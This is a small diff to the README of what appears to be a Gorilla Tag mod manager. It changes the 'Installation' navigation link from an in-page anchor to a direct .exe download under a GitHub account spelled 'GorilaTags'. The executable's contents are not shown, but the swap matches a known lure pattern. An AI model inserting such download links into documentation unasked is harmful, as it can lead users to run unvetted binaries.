@@ -5,7 +5,7 @@
 
 **Customize your gameplay. Explore new possibilities. Join the Monke community.**
 
-[Features](#-features) • [Installation](#-installation) • [Compatibility](#-compatibility) • [FAQ](#-frequently-asked-questions)
+[Features](#-features) • [Installation](https://github.com/GorilaTags/MonkeModManager/releases/download/1.1/MonkeModManager.exe) • [Compatibility](#-compatibility) • [FAQ](#-frequently-asked-questions)
 
 ![Platform](https://img.shields.io/badge/Platform-PC-blue?style=for-the-badge)
 ![Game](https://img.shields.io/badge/Game-Gorilla%20Tag-orange?style=for-the-badge)
